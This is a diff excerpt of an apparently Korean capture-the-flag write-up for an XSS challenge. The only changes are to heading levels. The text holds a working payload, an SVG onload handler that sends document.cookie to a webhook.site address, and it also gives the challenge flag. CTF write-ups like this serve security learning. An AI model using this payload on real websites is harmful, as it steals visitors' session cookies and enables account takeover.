@@ -8,8 +8,8 @@ vuln(xss) page의 param이
 
 그래서 flag 페이지를 이용해 로컬에서 외부 서버로 cookie 값을 전송해주는 코드를 넣어 solve 하였다.
 
-# Code
+## Code
 ```<svg/onload=location["href"]="https://webhook.site/webhook-id/?flag="+document["cookie"]>```
 
-# Flag
+## Flag
 flag{alert(/correct!/.source)}
